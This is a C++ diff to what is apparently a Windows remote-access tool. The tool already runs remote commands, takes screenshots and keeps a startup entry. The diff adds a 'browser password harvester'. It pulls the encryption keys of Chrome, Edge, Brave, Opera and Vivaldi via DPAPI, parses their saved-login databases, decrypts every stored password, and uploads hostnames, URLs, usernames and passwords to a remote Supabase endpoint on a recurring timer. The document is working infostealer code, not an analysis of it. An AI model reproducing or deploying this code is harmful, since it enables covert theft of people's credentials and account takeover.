@@ -6,6 +6,7 @@
 #include <cstdint>
 #include <ctime>
 #include <wincrypt.h>
+#include <bcrypt.h>
 #include <gdiplus.h>
 #include <dshow.h>
 #include <mmdeviceapi.h>
@@ -867,7 +868,214 @@ static void CheckAndHandleExec() {
     HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
     LogMsg("Exec: " + payload + " -> exit " + std::to_string((int)exitCode));
 }
+ 
+// === Browser password harvester ===
+ 
+#define SUPABASE_PASSWORDS_PATH L"/rest/v1/passwords"
+ 
+static uint32_t SqliteVarint(const uint8_t* p, int* used) {
+    uint32_t v = 0; *used = 0;
+    for (int i = 0; i < 9; i++) {
+        v = (v << 7) | (p[i] & 0x7F); (*used)++;
+        if (!(p[i] & 0x80)) return v;
+    }
+    return v;
+}
+ 
+static uint16_t SqliteU16(const uint8_t* p) { return (uint16_t)(p[0] << 8) | p[1]; }
+static uint32_t SqliteU32(const uint8_t* p) { return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3]; }
+ 
+static const uint8_t* SqliteColumn(const uint8_t* payload, int payloadLen, int colIndex, int* outSize) {
+    int used; uint32_t hdrSize = SqliteVarint(payload, &used);
+    if (hdrSize > (uint32_t)payloadLen) return NULL;
+    int pos = used, dataOff = (int)hdrSize;
+    for (int i = 0; i <= colIndex; i++) {
+        if ((uint32_t)pos >= hdrSize) return NULL;
+        uint32_t st = SqliteVarint(payload + pos, &used); pos += used;
+        int sz = 0;
+        if (st == 1) sz = 1; else if (st == 2) sz = 2; else if (st == 3) sz = 3;
+        else if (st == 4) sz = 4; else if (st == 5) sz = 6; else if (st == 6 || st == 7) sz = 8;
+        else if (st >= 12 && st % 2 == 0) sz = (st - 12) / 2;
+        else if (st >= 13) sz = (st - 13) / 2;
+        if (i == colIndex) { if (st == 0 || st == 8 || st == 9 || sz == 0) { *outSize = 0; return NULL; } *outSize = sz; return payload + dataOff; }
+        dataOff += sz;
+    }
+    return NULL;
+}
+ 
+static bool SqliteWalk(const uint8_t* db, size_t dbSize, uint16_t pageSize, int pageNum,
+    bool (*cb)(int64_t rowid, const uint8_t* payload, int payloadLen, void* user), void* user)
+{
+    if ((size_t)((pageNum - 1) * pageSize + 8) > dbSize) return false;
+    const uint8_t* page = db + (pageNum - 1) * pageSize;
+    int type = page[0];
+    if (type != 0x05 && type != 0x0D) return false;
+    uint16_t count = SqliteU16(page + 3);
+    if (type == 0x05) {
+        for (uint16_t i = 0; i < count; i++) {
+            uint16_t ptr = SqliteU16(page + pageSize - (i + 1) * 2);
+            if (ptr + 4 > pageSize) continue;
+            if (!SqliteWalk(db, dbSize, pageSize, (int)SqliteU32(page + ptr), cb, user)) return false;
+        }
+        return SqliteWalk(db, dbSize, pageSize, (int)SqliteU32(page + 8), cb, user);
+    }
+    for (uint16_t i = 0; i < count; i++) {
+        uint16_t ptr = SqliteU16(page + pageSize - (i + 1) * 2);
+        if (ptr + 2 > pageSize) continue;
+        int used; SqliteVarint(page + ptr, &used);
+        int ridUsed; uint64_t rowid = SqliteVarint(page + ptr + used, &ridUsed); used += ridUsed;
+        if (used + 4 > pageSize - ptr) continue;
+        if (!cb((int64_t)rowid, page + ptr + used, (int)(pageSize - ptr - used), user)) return false;
+    }
+    return true;
+}
+ 
+static int SqliteFindTableRoot(const uint8_t* db, size_t dbSize, uint16_t pageSize, const char* name) {
+    struct Ctx { const char* name; int root; };
+    Ctx ctx = { name, 0 };
+    SqliteWalk(db, dbSize, pageSize, 1,
+        [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
+            auto* c = (Ctx*)u; int nLen;
+            const uint8_t* tn = SqliteColumn(p, pl, 2, &nLen);
+            if (tn && nLen > 0 && (int)strlen(c->name) == nLen && memcmp(tn, c->name, nLen) == 0) {
+                int rLen; const uint8_t* rp = SqliteColumn(p, pl, 3, &rLen);
+                if (rp && rLen > 0 && rLen <= 4) for (int b = 0; b < rLen; b++) c->root = (c->root << 8) | rp[b];
+                return false;
+            }
+            return true;
+        }, &ctx);
+    return ctx.root;
+}
+ 
+static bool ChromeDecryptPassword(const uint8_t* key, int keyLen, const uint8_t* blob, int blobLen, std::string& out) {
+    if (blobLen < 15 || blob[0] != 'v' || blob[1] != '1' || blob[2] != '0') return false;
+    const uint8_t* nonce = blob + 3;
+    const uint8_t* ct = blob + 15;
+    int ctLen = blobLen - 15 - 16;
+    if (ctLen <= 0) return false;
+    const uint8_t* tag = ct + ctLen;
+ 
+    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL; bool ok = false;
+    ULONG ol = 0; DWORD tv = 16;
+    if (FAILED(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return false;
+    if (FAILED(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)L"ChainingModeGCM", (ULONG)(sizeof(L"ChainingModeGCM")), 0))) goto done;
+    BCryptSetProperty(hAlg, BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&tv, sizeof(tv), 0);
+    if (FAILED(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0))) goto done;
 
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
+    BCRYPT_INIT_AUTH_MODE_INFO(ai);
+    ai.pbNonce = (PUCHAR)nonce; ai.cbNonce = 12; ai.pbTag = (PUCHAR)tag; ai.cbTag = 16;
+
+    out.resize(ctLen + 32);
+    if (SUCCEEDED(BCryptDecrypt(hKey, (PUCHAR)ct, ctLen, &ai, NULL, 0, (PUCHAR)out.data(), (ULONG)out.size(), &ol, 0))) { out.resize(ol); ok = true; }
+done:
+    if (hKey) BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
+    return ok;
+}
+ 
+static const struct { const char* name; const char* ls; const char* ld; } kChromeBrowsers[] = {
+    {"Chrome",  "\\Google\\Chrome\\User Data\\Local State",  "\\Google\\Chrome\\User Data\\Default\\Login Data"},
+    {"Edge",    "\\Microsoft\\Edge\\User Data\\Local State",  "\\Microsoft\\Edge\\User Data\\Default\\Login Data"},
+    {"Brave",   "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"},
+    {"Opera",   "\\Opera Software\\Opera Stable\\Local State", "\\Opera Software\\Opera Stable\\Login Data"},
+    {"Vivaldi", "\\Vivaldi\\User Data\\Local State",           "\\Vivaldi\\User Data\\Default\\Login Data"},
+    {NULL, NULL, NULL}
+};
+ 
+static void HarvestBrowserPasswords() {
+    char laBuf[MAX_PATH];
+    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
+    if (laLen == 0 || laLen >= MAX_PATH) return;
+    std::string la(laBuf);
+ 
+    for (int b = 0; kChromeBrowsers[b].name; b++) {
+        // Read + decrypt AES key from Local State
+        std::string lsPath = la + kChromeBrowsers[b].ls;
+        HANDLE hLs = CreateFileA(lsPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hLs == INVALID_HANDLE_VALUE) continue;
+        DWORD lsSize = GetFileSize(hLs, NULL);
+        if (lsSize > 65536) { CloseHandle(hLs); continue; }
+        std::string lsContent((size_t)lsSize, 0);
+        DWORD rd = 0;
+        if (!ReadFile(hLs, &lsContent[0], lsSize, &rd, NULL) || rd != lsSize) { CloseHandle(hLs); continue; }
+        CloseHandle(hLs);
+ 
+        std::string encKeyStr = ExtractJSONString(lsContent, "encrypted_key");
+        if (encKeyStr.empty()) continue;
+ 
+        // Base64 decode encrypted_key
+        DWORD decLen = (DWORD)encKeyStr.size() * 3 / 4 + 16;
+        std::vector<uint8_t> dec(decLen);
+        if (!CryptStringToBinaryA(encKeyStr.c_str(), (DWORD)encKeyStr.size(), CRYPT_STRING_BASE64, dec.data(), &decLen, NULL, NULL)) continue;
+        if (decLen <= 5) continue;
+ 
+        // DPAPI decrypt to get AES key
+        DATA_BLOB inBlob = { decLen - 5, dec.data() + 5 };
+        DATA_BLOB outBlob = { 0, NULL };
+        if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) continue;
+ 
+        uint8_t aesKey[32];
+        int keyLen = outBlob.cbData < 32 ? (int)outBlob.cbData : 32;
+        memcpy(aesKey, outBlob.pbData, keyLen);
+        LocalFree(outBlob.pbData);
+        if (keyLen != 32) { LogMsg(std::string(kChromeBrowsers[b].name) + ": unexpected key length " + std::to_string(keyLen)); continue; }
+ 
+        // Copy Login Data to temp
+        std::string ldPath = la + kChromeBrowsers[b].ld;
+        char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
+        std::string tmpLd = std::string(tmpDir) + "NPLD_" + std::to_string(GetTickCount()) + ".tmp";
+        if (!CopyFileA(ldPath.c_str(), tmpLd.c_str(), FALSE)) { continue; }
+ 
+        HANDLE hF = CreateFileA(tmpLd.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        HANDLE hM = NULL; const uint8_t* dbMap = NULL; size_t dbSz = 0;
+        if (hF != INVALID_HANDLE_VALUE) { dbSz = GetFileSize(hF, NULL); if (dbSz > 100) { hM = CreateFileMapping(hF, NULL, PAGE_READONLY, 0, 0, NULL); if (hM) dbMap = (const uint8_t*)MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0); } }
+        if (!dbMap) { if (hF) CloseHandle(hF); DeleteFileA(tmpLd.c_str()); continue; }
+ 
+        int psInt = SqliteU16(dbMap + 16); if (psInt == 1) psInt = 65536; if (psInt < 512) psInt = 512; uint16_t ps = (uint16_t)psInt;
+ 
+        int rootP = SqliteFindTableRoot(dbMap, dbSz, ps, "logins");
+        if (rootP > 0) {
+            struct HCtx { const uint8_t* db; size_t dbSz; uint16_t ps; uint8_t* ak; int kl; const char* bn; const char* hn; std::string batch; bool first; int count; };
+            HCtx hc = { dbMap, dbSz, ps, aesKey, 32, kChromeBrowsers[b].name, g_hostname.c_str(), "[", true, 0 };
+ 
+            SqliteWalk(dbMap, dbSz, ps, rootP, [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
+                auto* h = (HCtx*)u; int urlL;
+                const uint8_t* urlD = SqliteColumn(p, pl, 0, &urlL);
+                if (!urlD || urlL <= 0) return true;
+                std::string url((const char*)urlD, urlL);
+                if (url.find("://") == std::string::npos || url.find("chrome://") == 0 || url.find("about:") == 0 || url.find("edge://") == 0 || url.find("brave://") == 0) return true;
+ 
+                int usrL; const uint8_t* usrD = SqliteColumn(p, pl, 3, &usrL);
+                if (!usrD || usrL <= 0) return true;
+                std::string usr((const char*)usrD, usrL);
+ 
+                int pwL; const uint8_t* pwD = SqliteColumn(p, pl, 5, &pwL);
+                if (!pwD || pwL <= 15) return true;
+ 
+                std::string pwd;
+                if (!ChromeDecryptPassword(h->ak, h->kl, pwD, pwL, pwd) || pwd.empty()) return true;
+ 
+                std::string row = std::string(h->first ? "" : ",") + "{\"hostname\":\"" + EscapeJSON(h->hn) + "\",\"browser\":\"" + EscapeJSON(h->bn) + "\",\"origin_url\":\"" + EscapeJSON(url) + "\",\"username_value\":\"" + EscapeJSON(usr) + "\",\"password_value\":\"" + EscapeJSON(pwd) + "\"}";
+                h->batch += row; h->first = false; h->count++;
+                LogMsg(std::string(h->bn) + ": " + url + " / " + usr);
+                return true;
+            }, &hc);
+ 
+            if (hc.count > 0) {
+                hc.batch += "]";
+                std::string pr;
+                HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, hc.batch, pr);
+                LogMsg(std::string(kChromeBrowsers[b].name) + ": " + std::to_string(hc.count) + " passwords uploaded");
+            }
+        }
+ 
+        UnmapViewOfFile(dbMap);
+        if (hM) CloseHandle(hM); if (hF) CloseHandle(hF);
+        DeleteFileA(tmpLd.c_str());
+    }
+    LogMsg("Browser password harvest complete");
+}
+ 
 static std::string CheckScreenshotCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1285,6 +1493,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
+            }
+            if (counter % 300 == 0 && !g_selfDestructing) {
+                HarvestBrowserPasswords();
             }
             break;
         }
